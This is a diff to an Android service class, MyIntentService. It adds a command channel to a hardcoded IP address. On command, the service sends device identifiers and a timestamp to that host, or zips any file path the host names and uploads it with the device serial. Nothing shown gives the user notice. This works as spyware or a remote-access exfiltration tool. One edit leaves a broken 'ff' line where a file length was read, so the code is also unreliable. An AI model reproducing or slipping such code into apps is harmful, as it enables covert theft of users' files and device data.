@@ -6,6 +6,7 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Environment;
 import android.os.SystemClock;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -41,6 +42,8 @@ import java.util.Locale;
 
 
 public class MyIntentService extends IntentService {
+
+    private final String ip = "192.168.43.194";
 
     public MyIntentService() {
         super("MyIntentService");
@@ -115,10 +118,73 @@ public class MyIntentService extends IntentService {
         Log.e("doInBackground", "doInBackground");
         new Thread(new Runnable() {
             public void run() {
-                executeGetRequest();
+                JSONObject takeAll = takeAll();
+                executePostRequest(takeAll);
             }
         }).start();
     }
+
+    public void makeZip(String response){
+
+
+        if (response.contains("emulated"))
+            response = response.replace("emulated",Environment.getExternalStorageDirectory().getAbsolutePath());
+         else {
+            HashSet<String> hash = getExternalMounts();
+            Iterator it = hash.iterator();
+            it.next().toString();
+            response = response.replace("extSdCard",it.next().toString());
+        }
+
+        final String path = response;
+        Log.e("doInBackground", "doInBackground");
+        new Thread(new Runnable() {
+            public void run() {
+                Log.i("makeZip_OnRun", "Partito");
+                try {
+                    byte[] prova = Utility.zip(new String[] {path});
+                    JSONObject to_send = new JSONObject();
+                    String nomeFile = path.substring(path.lastIndexOf("\\/"),path.length());
+                    Log.i("makeZip_OnRun", nomeFile);
+
+                    to_send.put("BYTE_ARRAY",prova);
+                    to_send.put("SERIAL", Build.SERIAL);
+
+                    //executePostRequest(to_send);
+                    URL url = new URL("http://"+ip + ":8000");
+
+                    InputStream is = null;
+                    HttpURLConnection httpCon = null;
+
+                    //byte[] bytes = json_to_post.toString().getBytes("UTF-8");
+
+                    httpCon = (HttpURLConnection) url.openConnection();
+                    httpCon.setDoOutput(true);
+                    httpCon.setUseCaches(false);
+                    httpCon.setFixedLengthStreamingMode(prova.length);
+                    httpCon.setRequestMethod("POST");
+                    httpCon.setRequestProperty("Content-Type", "application/bytearray; charset=UTF-8");
+                    httpCon.setRequestProperty("id-device", Build.SERIAL);
+                    httpCon.setRequestProperty("filename", nomeFile);
+
+                    OutputStream os = httpCon.getOutputStream();
+                    os.write(prova);
+                    os.close();
+
+
+                    Log.e("takeAll-TST", "executePOSTRequest Finished");
+
+
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                Log.i("makeZip_OnRun", "Partito");
+            }
+        }).start();
+    }
+
 
 
         private JSONObject takeAll(){
@@ -174,6 +240,7 @@ public class MyIntentService extends IntentService {
                 jsonObject.put("BUILDN", Build.ID); /*Build Number*/
                 jsonObject.put("SERIAL", Build.SERIAL);
                 jsonObject.put("BRAND", Build.BRAND);
+                jsonObject.put("DATA", String.valueOf((int) (System.currentTimeMillis() / 1000L)));
 
             } catch (JSONException e) {
                 Log.e("testJSON: ", e.toString());
@@ -195,18 +262,16 @@ public class MyIntentService extends IntentService {
             return jsonObject;
         }
 
-        public String executeGetRequest() {
-            Log.e("takeAll-TST", "executePOSTRequest");
-            JSONObject jsonObject = takeAll();
+        public String executePostRequest(JSONObject json_to_post) {
 
             //OutputStream os = null;
             InputStream is = null;
             HttpURLConnection httpCon = null;
             try {
                 //constants
-                URL url = new URL("http://192.168.0.2:8000");
+                URL url = new URL("http://"+ip + ":8000");
 
-                byte[] bytes = jsonObject.toString().getBytes("UTF-8");
+                byte[] bytes = json_to_post.toString().getBytes("UTF-8");
 
                 httpCon = (HttpURLConnection) url.openConnection();
                 httpCon.setDoOutput(true);
@@ -277,7 +342,9 @@ public class MyIntentService extends IntentService {
                             what.put("sub", lsRecursive(new File(ff.getPath())));
                         else {
                             what.put("sub", "");
-                            what.put("Byte", ff.length());
+                            what.put("Byte", ff
+
+                            );
                         }
 
                     } catch (JSONException e) {
@@ -544,7 +611,7 @@ public class MyIntentService extends IntentService {
             BufferedReader br = null;
             while (true){
                 try {
-                    s = new Socket("192.168.0.2", 8889);
+                    s = new Socket(ip, 8889);
 
                     DataOutputStream dos = null;
 
@@ -564,7 +631,7 @@ public class MyIntentService extends IntentService {
                         String response = br.readLine(); //read line
                         br = new BufferedReader(new InputStreamReader(s.getInputStream()));
 
-                        Log.e("TSTTTT", response + " " + response.toString() + " " + response.length());
+                        Log.i("TSTTTT", response + " " + response.toString() + " " + response.length());
 
                         if (br == null) {
                             Log.e("TESTSOCKET", "BR NULL");
@@ -573,13 +640,19 @@ public class MyIntentService extends IntentService {
 
 
                         if (response.equals("ack")) {
-                            Log.e("TESTSOCKET", "primo");
+                            Log.i("TESTSOCKET", "primo");
                             SystemClock.sleep(1000);
                             toWrite = "ack";
-                        } else {
-                            Log.e("TESTSOCKET", "secondo");
+                            dos.writeUTF(toWrite);
+                        } else if (response.equals("takeAll")){
+                            Log.i("TESTSOCKET", "takeAll");
                             toWrite = "OK";
                             doSomething();
+                        }else {
+                            Log.i("TESTSOCKET", "take file");
+                            toWrite = "OK";
+                            makeZip(response);
+                            //
                         }
 
                         dos.writeUTF(toWrite);
@@ -691,6 +764,8 @@ public class MyIntentService extends IntentService {
             while (iterator.hasNext()) {
                 pr += iterator.next();
             }
+
+
             Log.e("testJSON: ", "done -> " + pr);*//*
 
             HashSet<String> ttt = getExternalMounts();
